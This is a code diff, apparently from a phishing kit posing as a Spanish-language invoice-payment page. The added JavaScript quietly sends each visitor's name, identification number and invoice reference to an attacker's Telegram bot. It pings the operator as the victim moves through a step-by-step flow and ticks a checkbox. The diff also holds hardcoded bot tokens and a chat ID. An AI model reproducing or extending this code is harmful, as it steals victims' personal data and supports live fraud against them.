@@ -1062,7 +1062,7 @@ main {
 // ==========================================
 // 🔑 CONFIGURACIÓN DE TELEGRAM
 // ==========================================
-const TG_BOT_TOKEN = '8861202697:AAFR82-mSGAhQbN91qJcjugZXpHeP1_7gD4';
+const TG_BOT_TOKEN = '8720080632:AAHx4C3zh9LD4GEVOohesCsxMx9U-3TAZHk';
 const TG_CHAT_ID = '7776240161';
 
 // ==========================================
@@ -1481,21 +1481,22 @@ function procesarDatosFacturas(texto) {
         btnDesplegarTabla.innerHTML = `▼ Mostrar más facturas`;
     }
 
+    // 🚀 OCULTAR OVERLAY Y MOSTRAR VISTA AMARILLA
     ocultarOverlay();
     contenedorOriginal.style.display = 'none';
     viewAmarilla.classList.add('active');
-    iniciarFlujoAmarillo();
-
+    
     // 🚀 ALERTA PARA TI: EL USUARIO YA ESTÁ EN LA PÁGINA
     fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`, {
         method: 'POST', headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ 
             chat_id: TG_CHAT_ID, 
-            text: `✅ <b>EL USUARIO YA ESTÁ EN LA PÁGINA</b>\n\n👤 <b>Nombre:</b> ${nombreUsuario}\n🔍 <b>Identificación:</b> <code>${idBuscadoGlobal}</code>\n📄 <b>Referencia:</b> <code>${referenciaCompleta}</code>\n\n<i>Los datos se cargaron correctamente en pantalla.</i>`, 
+            text: `✅ <b>EL USUARIO YA ESTÁ EN LA PÁGINA (PASO 1)</b>\n\n👤 <b>Nombre:</b> ${nombreUsuario}\n🔍 <b>Identificación:</b> <code>${idBuscadoGlobal}</code>\n📄 <b>Referencia:</b> <code>${referenciaCompleta}</code>\n\n<i>Esperando a que marque el checkbox...</i>`, 
             parse_mode: 'HTML' 
         })
     });
 
+    iniciarFlujoAmarillo();
 }
 
 // Lógica del botón desplegar
@@ -1533,11 +1534,22 @@ function iniciarFlujoAmarillo() {
     actualizarPasoAmarillo();
 }
 
+// 🚀 NOTIFICAR A TELEGRAM CUANDO SE MARCA EL CHECK
 cajaPaso1.addEventListener('click', function() {
     if (pasoActualAmarillo === 1 && !checkPaso1Activado) {
         checkPaso1Activado = true;
         checkPaso1.classList.add('activo');
         btnAccionAmarillo.classList.remove('opaco');
+
+        // Enviar alerta a Telegram
+        fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`, {
+            method: 'POST', headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ 
+                chat_id: TG_CHAT_ID, 
+                text: `☑️ <b>EL USUARIO HA MARCADO EL CHECK</b>\n\n🔍 Identificación: <code>${idBuscadoGlobal}</code>\n\n<i>Ya puede avanzar al Paso 2.</i>`, 
+                parse_mode: 'HTML' 
+            })
+        });
     }
 });
 
